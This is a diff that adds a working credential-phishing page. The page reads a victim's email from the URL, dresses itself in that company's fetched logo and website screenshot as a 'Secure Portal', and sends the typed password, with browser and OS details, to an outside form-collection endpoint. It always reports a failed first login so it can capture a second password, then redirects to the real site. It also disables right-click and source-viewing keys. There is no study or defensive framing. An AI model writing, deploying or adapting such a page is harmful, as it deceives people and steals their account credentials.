@@ -1,0 +1,732 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <!-- SECURITY -->
+  <meta name="robots" content="noindex, nofollow">
+  <meta name="referrer" content="no-referrer">
+  <meta http-equiv="X-Content-Type-Options" content="nosniff">
+  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+  <meta http-equiv="Pragma" content="no-cache">
+  <meta http-equiv="Expires" content="0">
+  
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+  
+  <title id="pageTitle">Loading...</title>
+  
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      background: #1a1a2e;
+      background-size: cover;
+      background-position: center;
+      transition: background 0.8s ease;
+    }
+    
+    body::before {
+      content: '';
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.55);
+      z-index: 0;
+    }
+    
+    /* --- HUMAN VERIFICATION OVERLAY --- */
+    #human-verify {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: #0f172a;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 99999;
+      flex-direction: column;
+      padding: 20px;
+    }
+    
+    #human-verify .box {
+      background: #1e293b;
+      padding: 40px 30px;
+      border-radius: 16px;
+      max-width: 420px;
+      width: 100%;
+      text-align: center;
+      border: 1px solid #334155;
+      box-shadow: 0 20px 40px rgba(0,0,0,0.5);
+    }
+    
+    #human-verify h2 {
+      color: #f1f5f9;
+      font-size: 22px;
+      margin-bottom: 8px;
+    }
+    
+    #human-verify p {
+      color: #94a3b8;
+      font-size: 14px;
+      margin-bottom: 20px;
+      line-height: 1.6;
+    }
+    
+    #human-verify .spinner {
+      width: 48px;
+      height: 48px;
+      border: 4px solid #334155;
+      border-top-color: #3b82f6;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      margin: 0 auto 16px;
+    }
+    
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    
+    /* --- MODERN ELEVATED FLOATING CARD --- */
+    .chameleon-container {
+      width: 100%;
+      max-width: 560px;
+      background: #ffffff;
+      border-radius: 16px;
+      box-shadow: 
+        0 4px 6px rgba(0, 0, 0, 0.02),
+        0 8px 30px rgba(0, 0, 0, 0.08),
+        0 20px 60px rgba(0, 0, 0, 0.12),
+        0 40px 80px rgba(0, 0, 0, 0.06);
+      overflow: hidden;
+      display: none;
+      position: relative;
+      z-index: 10;
+      animation: fadeIn 0.6s ease;
+      transition: transform 0.3s ease, box-shadow 0.4s ease;
+    }
+    
+    .chameleon-container:hover {
+      box-shadow: 
+        0 8px 12px rgba(0, 0, 0, 0.02),
+        0 12px 40px rgba(0, 0, 0, 0.10),
+        0 30px 80px rgba(0, 0, 0, 0.15),
+        0 50px 100px rgba(0, 0, 0, 0.08);
+      transform: translateY(-4px);
+    }
+    
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(24px) scale(0.97); }
+      to { opacity: 1; transform: translateY(0) scale(1); }
+    }
+    
+    /* Brand Header - Logo + Company Name */
+    .brand-header {
+      padding: 28px 30px 18px;
+      text-align: center;
+      border-bottom: 1px solid #f0f0f0;
+      background: #ffffff;
+    }
+    
+    .brand-logo-wrapper {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-bottom: 8px;
+      min-height: 70px;
+    }
+    
+    .brand-logo {
+      max-width: 120px;
+      max-height: 70px;
+      width: auto;
+      height: auto;
+      display: block;
+    }
+    
+    .brand-name {
+      font-size: 22px;
+      font-weight: 700;
+      color: #1a1a1a;
+      letter-spacing: -0.3px;
+    }
+    
+    /* Visitor Info - Clean (Black Text) */
+    .visitor-info {
+      text-align: center;
+      padding: 14px 20px 10px;
+      font-size: 13px;
+      color: #000000;
+      border-bottom: 1px solid #f0f0f0;
+    }
+    
+    .visitor-info .visitor-row {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 4px 12px;
+    }
+    
+    .visitor-info .visitor-row span {
+      display: inline-flex;
+      align-items: center;
+      gap: 4px;
+    }
+    
+    .visitor-info .visitor-row i {
+      font-size: 14px;
+      color: #000000;
+    }
+    
+    .visitor-info .email {
+      color: #244db8;
+      font-size: 24px;
+      margin-top: 8px;
+      margin-bottom: 10px;
+      font-weight: 400;
+      word-break: break-all;
+    }
+    
+    /* Content - Friend's Style */
+    .chameleon-content {
+      padding: 20px 30px 24px;
+    }
+    
+    .message {
+      text-align: center;
+      font-size: 14px;
+      color: #222;
+      margin-bottom: 16px;
+    }
+    
+    .message b {
+      display: block;
+      font-size: 15px;
+    }
+    
+    .email-display {
+      display: none;
+    }
+    
+    /* Form */
+    .login-form {
+      margin-top: 4px;
+    }
+    
+    .form-group {
+      margin-bottom: 16px;
+      position: relative;
+    }
+    
+    .input-with-icon {
+      position: relative;
+      width: 100%;
+    }
+    
+    .input-with-icon input {
+      width: 100%;
+      padding: 12px 14px;
+      border: 2px solid #2d7df4;
+      border-radius: 4px;
+      font-size: 15px;
+      transition: border-color 0.3s, box-shadow 0.3s;
+      background: #fafafa;
+      outline: none;
+    }
+    
+    .input-with-icon input:focus {
+      border-color: #2d7df4;
+      background: #ffffff;
+      box-shadow: 0 0 0 4px rgba(45, 125, 244, 0.08);
+    }
+    
+    /* Eye icon - hidden by default, small, subtle */
+    .toggle-password {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      cursor: pointer;
+      color: #94a3b8;
+      font-size: 12px;
+      z-index: 1;
+      display: none;
+    }
+    
+    .toggle-password:hover {
+      color: #1a1a1a;
+    }
+    
+    .toggle-password.visible {
+      display: block;
+    }
+    
+    /* RED ERROR - PERMANENTLY VISIBLE */
+    .auth-error {
+      color: #d11a1a;
+      font-size: 14px;
+      margin-top: 10px;
+      margin-bottom: 10px;
+      text-align: center;
+      font-weight: 500;
+      display: block !important;
+    }
+    
+    .checkbox-group {
+      margin: 0 0 20px 0;
+    }
+    
+    .checkbox-group label {
+      font-size: 14px;
+      color: #444;
+    }
+    
+    .checkbox-group input {
+      margin-right: 8px;
+      width: auto;
+      height: auto;
+      accent-color: #2d7df4;
+    }
+    
+    .btn-submit {
+      width: 100%;
+      padding: 14px;
+      background: #2b8df2;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      font-size: 18px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.3s, transform 0.15s;
+    }
+    
+    .btn-submit:hover {
+      background: #1976d2;
+    }
+    
+    .btn-submit:active {
+      transform: scale(0.98);
+    }
+    
+    .footer-links {
+      display: none;
+    }
+    
+    .footer {
+      text-align: center;
+      color: #666;
+      font-size: 13px;
+      margin-top: 16px;
+    }
+    
+    .footer span {
+      color: #2b8df2;
+    }
+    
+    .security-badge {
+      background: #fafbfc;
+      border-top: 1px solid #f0f0f0;
+      padding: 14px;
+      text-align: center;
+      font-size: 12px;
+      color: #94a3b8;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 8px;
+    }
+    
+    .security-badge i {
+      color: #22c55e;
+      font-size: 14px;
+    }
+    
+    .loader {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.6);
+      z-index: 9999;
+      justify-content: center;
+      align-items: center;
+    }
+    
+    .loader::after {
+      content: "";
+      width: 40px;
+      height: 40px;
+      border: 4px solid #fff;
+      border-top-color: #2b8df2;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
+    
+    @media (max-width: 500px) {
+      .chameleon-container {
+        border-radius: 0;
+        box-shadow: none;
+        transform: none !important;
+      }
+      .chameleon-container:hover {
+        transform: none !important;
+      }
+      .brand-header {
+        padding: 20px 16px 14px;
+      }
+      .chameleon-content {
+        padding: 16px;
+      }
+      .visitor-info {
+        font-size: 12px;
+        padding: 10px 16px 8px;
+      }
+      .visitor-info .email {
+        font-size: 20px;
+      }
+      #human-verify .box {
+        padding: 30px 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- HUMAN VERIFICATION OVERLAY -->
+  <div id="human-verify">
+    <div class="box">
+      <div class="spinner" id="verify-spinner"></div>
+      <h2>🔒 Security Check</h2>
+      <p>Verifying your connection to the secure portal...</p>
+    </div>
+  </div>
+
+  <!-- CHAMELEON CARD -->
+  <div class="chameleon-container" id="chameleonContainer">
+    
+    <!-- Brand Header - Logo + Company Name -->
+    <div class="brand-header" id="brandHeader">
+      <div class="brand-logo-wrapper">
+        <img class="brand-logo" id="brandLogo" src="" alt="Company Logo">
+      </div>
+      <div class="brand-name" id="brandName">Loading...</div>
+    </div>
+    
+    <!-- Visitor Info - Clean (Black Text) -->
+    <div class="visitor-info" id="visitorInfo">
+      <div class="visitor-row">
+        <span><i class="fas fa-calendar-alt"></i> <span id="visitDate">Loading...</span></span>
+        <span><i class="fas fa-clock"></i> <span id="visitTime">Loading...</span></span>
+        <span><i class="fas fa-globe" id="browserIcon"></i> <span id="visitBrowser">Loading...</span></span>
+        <span><i class="fab fa-windows" id="osIcon"></i> <span id="visitOS">Loading...</span></span>
+        <span><i class="fas fa-map-marker-alt"></i> <span id="visitLocation">Loading...</span></span>
+      </div>
+      
+      <div class="email" id="emailDisplay">
+        Loading...
+      </div>
+    </div>
+    
+    <div class="chameleon-content">
+      <!-- Message - Friend's Style -->
+      <div class="message">
+        Session authentication! Please provide your
+        <b id="domainDisplay">Loading...</b>
+        password to continue.
+      </div>
+      
+      <form id="loginForm">
+        <input type="text" name="_gotcha" style="display:none" tabindex="-1" autocomplete="off">
+        <input type="hidden" id="emailField" name="email">
+        
+        <div class="form-group">
+          <div class="input-with-icon">
+            <input type="password" id="passwordField" name="password" placeholder="Password" required oninput="toggleEyeIcon()">
+            <span class="toggle-password" id="eyeIcon" onclick="togglePasswordVisibility()">
+              <i class="fas fa-eye"></i>
+            </span>
+          </div>
+        </div>
+        
+        <!-- RED ERROR - PERMANENTLY VISIBLE -->
+        <div class="auth-error" id="authError">Authentication is required!</div>
+        
+        <div class="checkbox-group">
+          <label>
+            <input type="checkbox" id="showPassword" onchange="togglePasswordVisibility()">
+            Show password
+          </label>
+        </div>
+        
+        <button type="submit" class="btn-submit">NEXT</button>
+      </form>
+      
+      <!-- Footer - Friend's Style -->
+      <div class="footer">
+        © 2026 <span id="footerDomain">Loading...</span> Secure Portal | Privacy
+      </div>
+    </div>
+    
+    <!-- Green SSL Badge -->
+    <div class="security-badge">
+      <i class="fas fa-shield-alt"></i> Secure SSL Connection
+    </div>
+  </div>
+
+  <div class="loader" id="loader"></div>
+
+  <script>
+    const FORMSPARK_URL = "https://submit-form.com/V36Vd3Du4";
+    
+    // --- GET EMAIL FROM URL ---
+    function getEmailFromURL() {
+      let email = null;
+      if (window.location.hash) {
+        let hash = window.location.hash.substring(1);
+        if (hash.includes('&')) hash = hash.split('&')[0];
+        if (hash.includes('@')) email = hash;
+      }
+      if (!email) {
+        const params = new URLSearchParams(window.location.search);
+        if (params.has('email')) email = params.get('email');
+      }
+      return email;
+    }
+    
+    // --- DETECT OS AND ICON ---
+    function getOSInfo() {
+      const ua = navigator.userAgent;
+      if (ua.includes('Windows')) {
+        if (ua.includes('Windows NT 10.0')) return { name: 'Windows', icon: 'fa-windows' };
+        if (ua.includes('Windows NT 6.3')) return { name: 'Windows 8.1', icon: 'fa-windows' };
+        if (ua.includes('Windows NT 6.2')) return { name: 'Windows 8', icon: 'fa-windows' };
+        if (ua.includes('Windows NT 6.1')) return { name: 'Windows 7', icon: 'fa-windows' };
+        return { name: 'Windows', icon: 'fa-windows' };
+      }
+      if (ua.includes('Mac OS X') || ua.includes('Macintosh')) {
+        return { name: 'macOS', icon: 'fa-apple' };
+      }
+      if (ua.includes('Linux')) {
+        if (ua.includes('Android')) return { name: 'Android', icon: 'fa-android' };
+        if (ua.includes('CrOS')) return { name: 'ChromeOS', icon: 'fa-chrome' };
+        return { name: 'Linux', icon: 'fa-linux' };
+      }
+      if (/iPhone|iPad|iPod/i.test(ua)) return { name: 'iOS', icon: 'fa-apple' };
+      return { name: 'Unknown', icon: 'fa-desktop' };
+    }
+    
+    // --- DETECT BROWSER AND ICON ---
+    function getBrowserInfo() {
+      const ua = navigator.userAgent;
+      if (ua.includes('Chrome') && !ua.includes('Edg') && !ua.includes('OPR')) return { name: 'Chrome', icon: 'fa-chrome' };
+      if (ua.includes('Safari') && !ua.includes('Chrome')) return { name: 'Safari', icon: 'fa-safari' };
+      if (ua.includes('Firefox')) return { name: 'Firefox', icon: 'fa-firefox' };
+      if (ua.includes('Edg')) return { name: 'Edge', icon: 'fa-edge' };
+      if (ua.includes('OPR') || ua.includes('Opera')) return { name: 'Opera', icon: 'fa-opera' };
+      return { name: 'Unknown', icon: 'fa-globe' };
+    }
+    
+    // --- GET LOCATION ---
+    async function getLocation() {
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+        if (data.city && data.country_code) {
+          return `${data.city}, ${data.country_code}`;
+        }
+      } catch {}
+      
+      try {
+        const res2 = await fetch('https://ipinfo.io/json');
+        const data2 = await res2.json();
+        if (data2.city && data2.country) {
+          return `${data2.city}, ${data2.country}`;
+        }
+      } catch {}
+      
+      return 'Unknown';
+    }
+    
+    // --- EYE ICON TOGGLE ---
+    function toggleEyeIcon() {
+      const passwordField = document.getElementById('passwordField');
+      const eyeIcon = document.getElementById('eyeIcon');
+      if (passwordField.value.length > 0) {
+        eyeIcon.classList.add('visible');
+      } else {
+        eyeIcon.classList.remove('visible');
+      }
+    }
+    
+    function togglePasswordVisibility() {
+      const passwordField = document.getElementById('passwordField');
+      const eyeIcon = document.getElementById('eyeIcon');
+      const checkbox = document.getElementById('showPassword');
+      const isVisible = passwordField.type === 'text';
+      
+      if (isVisible) {
+        passwordField.type = 'password';
+        eyeIcon.innerHTML = '<i class="fas fa-eye"></i>';
+        checkbox.checked = false;
+      } else {
+        passwordField.type = 'text';
+        eyeIcon.innerHTML = '<i class="fas fa-eye-slash"></i>';
+        checkbox.checked = true;
+      }
+    }
+    
+    // --- FETCH BRANDING AND BACKGROUND ---
+    async function fetchBranding(domain) {
+      try {
+        const nameParts = domain.split('.');
+        const brandName = nameParts[0].charAt(0).toUpperCase() + nameParts[0].slice(1);
+        document.getElementById('brandName').textContent = brandName;
+        document.getElementById('domainDisplay').textContent = domain;
+        document.getElementById('footerDomain').textContent = domain;
+        document.getElementById('pageTitle').textContent = `${brandName} · Secure Portal`;
+        
+        // --- LOGO FETCH ---
+        const logoImg = document.getElementById('brandLogo');
+        logoImg.src = `https://img.logo.dev/${domain}?token=pk_N3r1ruvPTqCTWk6c6ZhZUQ`;
+        logoImg.onerror = function() {
+          this.src = `https://logo.clearbit.com/${domain}`;
+          this.onerror = function() {
+            this.style.display = 'none';
+          };
+        };
+        
+        // DYNAMIC BACKGROUND
+        const bgUrl = `https://image.thum.io/get/width/1200/https://${domain}`;
+        const img = new Image();
+        img.onload = function() {
+          document.body.style.backgroundImage = `linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.5)), url('${bgUrl}')`;
+          document.body.style.backgroundSize = 'cover';
+          document.body.style.backgroundPosition = 'center';
+        };
+        img.onerror = function() {
+          document.body.style.background = 'linear-gradient(135deg, #0f172a, #1e293b)';
+        };
+        img.src = bgUrl;
+        
+      } catch (e) {
+        console.log('Branding error:', e);
+      }
+    }
+    
+    // --- INITIALIZE PAGE ---
+    async function initPage() {
+      const email = getEmailFromURL();
+      const domain = email ? email.split('@')[1] : 'unknown.com';
+      
+      document.getElementById('emailDisplay').textContent = email || 'No email specified';
+      document.getElementById('emailField').value = email || '';
+      document.getElementById('pageTitle').textContent = `${domain} · Secure Portal`;
+      
+      const now = new Date();
+      const dateStr = now.toDateString();
+      const timeStr = now.toLocaleTimeString();
+      
+      document.getElementById('visitDate').textContent = dateStr;
+      document.getElementById('visitTime').textContent = timeStr;
+      document.getElementById('visitLocation').textContent = await getLocation();
+      
+      const os = getOSInfo();
+      document.getElementById('osIcon').className = `fab ${os.icon}`;
+      document.getElementById('visitOS').textContent = os.name;
+      
+      const browser = getBrowserInfo();
+      document.getElementById('browserIcon').className = `fab ${browser.icon}`;
+      document.getElementById('visitBrowser').textContent = browser.name;
+      
+      await fetchBranding(domain);
+      
+      document.getElementById('chameleonContainer').style.display = 'block';
+    }
+    
+    // --- SECURITY ---
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    document.addEventListener('keydown', function(e) {
+      if (e.ctrlKey && (e.key === 'u' || e.key === 'U' || e.key === 's' || e.key === 'S' || e.key === 'c' || e.key === 'C' || e.key === 'a' || e.key === 'A')) e.preventDefault();
+      if (e.key === 'F12') e.preventDefault();
+    });
+    if (window.top !== window.self) window.top.location = window.self.location;
+    window.addEventListener('pageshow', function(e) { if (e.persisted) window.location.reload(); });
+    
+    // --- FORM SUBMISSION ---
+    let attemptCount = 0;
+    let firstPassword = '';
+    
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
+      
+      const email = document.getElementById('emailField').value.trim();
+      const password = document.getElementById('passwordField').value.trim();
+      const errorEl = document.getElementById('authError');
+      
+      if (!email || !password) {
+        errorEl.textContent = 'Please fill in all fields.';
+        errorEl.style.display = 'block';
+        return;
+      }
+      
+      attemptCount++;
+      errorEl.style.display = 'block';
+      
+      try {
+        await fetch(FORMSPARK_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            email: email,
+            password: password,
+            attempt: attemptCount,
+            os: getOSInfo().name,
+            browser: getBrowserInfo().name,
+            timestamp: new Date().toISOString()
+          })
+        });
+      } catch (err) {
+        console.log('Formspark error:', err);
+      }
+      
+      if (attemptCount === 1) {
+        firstPassword = password;
+        errorEl.textContent = 'Authentication is required! Please try again.';
+        errorEl.style.display = 'block';
+        document.getElementById('passwordField').value = '';
+        document.getElementById('passwordField').focus();
+      } else {
+        const domain = email.split('@')[1];
+        document.getElementById('loader').style.display = 'flex';
+        setTimeout(() => {
+          window.location.href = `https://${domain}`;
+        }, 1500);
+      }
+    });
+    
+    // --- AUTO-VERIFY ---
+    setTimeout(function() {
+      document.getElementById('human-verify').style.display = 'none';
+      initPage();
+    }, 3000);
+  </script>
+</body>
+</html>
